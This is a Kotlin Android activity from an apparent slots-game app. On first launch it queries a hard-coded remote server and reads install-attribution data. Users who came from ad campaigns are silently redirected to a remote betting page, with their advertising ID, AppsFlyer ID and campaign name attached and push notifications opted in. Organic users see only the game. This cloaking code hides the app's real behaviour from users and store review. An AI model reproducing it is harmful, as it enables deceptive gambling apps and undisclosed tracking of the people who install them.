package com.superslots.wingams

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.viewModels
import androidx.compose.runtime.MutableState
import androidx.compose.runtime.mutableStateOf
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import androidx.core.view.WindowInsetsControllerCompat
import androidx.navigation.compose.NavHost
import androidx.navigation.compose.composable
import androidx.navigation.compose.rememberNavController
import com.appsflyer.AppsFlyerLib
import com.onesignal.OneSignal
import com.superslots.domain.usecase.Constants
import com.superslots.domain.usecase.netChe
import com.superslots.ui.theme.EgyptGameTheme
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request


val spalsh = "splash"
val game = "game"
class BetBooster : ComponentActivity() {

    private val viewModel: MyViewModel by viewModels()
    private lateinit var sharedPreferences: SharedPreferences
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val wc = WindowCompat.getInsetsController(window,window.decorView)
        wc.systemBarsBehavior = WindowInsetsControllerCompat.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
        wc.hide(WindowInsetsCompat.Type.systemBars())

        OneSignal.initWithContext(this, Constants.oneSignalIdKey)
        val scope = CoroutineScope(Dispatchers.IO)
        scope.launch {
            OneSignal.Notifications.requestPermission(true)
        }
        val canWeGo = mutableStateOf(false)
        sharedPreferences = getSharedPreferences("MEGABET", Context.MODE_PRIVATE)




        val decodedString = "https://lstasisal.online/p6twp7"
        val appsFlyerUid = AppsFlyerLib.getInstance().getAppsFlyerUID(this)

        if(netChe(this)) {
            val client = OkHttpClient()
            val request = Request.Builder().url(decodedString).build()
            scope.launch {
                Log.d("fkqwjrio",isFirstLaunch().toString())
                    if (isFirstLaunch()) {
                        val response = client.newCall(request).execute()
                        val responseCode = response.code
                        if (!sharedPreferences.contains("code")) {
                            sharedPreferences.edit().putInt(
                                "code",
                                responseCode
                            ).apply()
                        }
                            Log.d("fkqwjrio",responseCode.toString())
                            Log.d("fkqwjrio",sharedPreferences.getString("siteUrl","").toString())
                        withContext(Dispatchers.Main) {
                            viewModel.initializeAppsFlyer(this@BetBooster) { conversionData ->
                                Log.d("fkqwjrio", "fetchAppsFlyerData")

                                Log.d("fkqwjrio2", "conversionData = $conversionData")
                                if (conversionData != null && conversionData["af_status"].toString()
                                        .contains("No")
                                ) {
                                    handleConversionData(
                                        conversionData,
                                        appsFlyerUid.toString(),
                                        response.body?.string().toString()
                                    )



                                    Log.d("fkqwjrio", "handleConversionData")
                                } else {
                                    if (sharedPreferences.getString("siteUrl", "")
                                            .isNullOrEmpty()
                                        && responseCode == 200
                                    ) {
                                        sharedPreferences.edit().putString(
                                            "siteUrl",
                                            response.body?.string().toString()
                                        ).apply()
                                    }
                                    Log.d("fkqwjrio", "navigateToSiteUrl1")
                                    navigateToSiteUrl(canWeGo, responseCode)
                                }

                                Log.d("fkqwjrio", "waiting for conversionDataFailLiveData...")

                            }

                            Log.d("fkqwjrio", "markFirstLaunch")
                            markFirstLaunch()
                        }
                    } else {
                        navigateToSiteUrl(canWeGo,sharedPreferences.getInt("code",404))
                        Log.d("fkqwjrio","navigateToSiteUrl3")
                    }
            }
        }
        else
            navigateToSiteUrl(canWeGo,404)





        setContent {
            EgyptGameTheme {
                    val navController = rememberNavController()
                        NavHost(navController = navController, startDestination = spalsh){
                            composable(spalsh){
                                SplashBetScreen(canWeGo = canWeGo ) {
                                    navController.navigate(game){launchSingleTop=true}
                                }

                            }
                            composable(game){
                                EgyptGameScreen()
                            }
                        }
            }
        }
    }

    private fun isFirstLaunch(): Boolean {
        val preferences = getPreferences(Context.MODE_PRIVATE)
        return preferences.getBoolean("isFirstLaunch", true)
    }

    private fun markFirstLaunch() {
        val editor = getPreferences(Context.MODE_PRIVATE).edit()
        editor.putBoolean("isFirstLaunch", false)
        editor.apply()
    }
    private fun handleConversionData(
        data: Map<String, Any>,
        appsFlyerUid: String,
        someValue: String
    ) {
        val eventData = mapOf(
            "c" to data["campaign"].toString(),
            "afID" to appsFlyerUid,
            "ad" to viewModel.advertisingId
        )
        Log.d("fkqwjrio","handleConversionData")
        OneSignal.login(viewModel.advertisingId)
        OneSignal.User.pushSubscription.optIn()
        val newLink = viewModel.buildFinalLink(someValue, viewModel.someValue, eventData)
        Log.d("fkqwjrio",newLink)
        val tripEgypt = Intent(this@BetBooster,BetBonus::class.java)
        tripEgypt.putExtra("url",newLink)
        sharedPreferences.edit().putString("url",newLink).apply()
        startActivity(tripEgypt)
        finish()

    }

    private fun navigateToSiteUrl(canWeGo:MutableState<Boolean>,responseCode:Int) {


        if (sharedPreferences.contains("siteUrl") ||responseCode == 200 ) {
          val link =  sharedPreferences.getString("siteUrl", null)
            Log.d("fkqwjrio",link.toString())
            val tripEgypt = Intent(this@BetBooster,BetBonus::class.java)
            tripEgypt.putExtra("url",link)
            sharedPreferences.edit().putString("url",link).apply()
            startActivity(tripEgypt)
            finish()
        } else {
                Log.d("fkqwjrio","canWeGo.value = true")
                canWeGo.value = true
        }
    }

}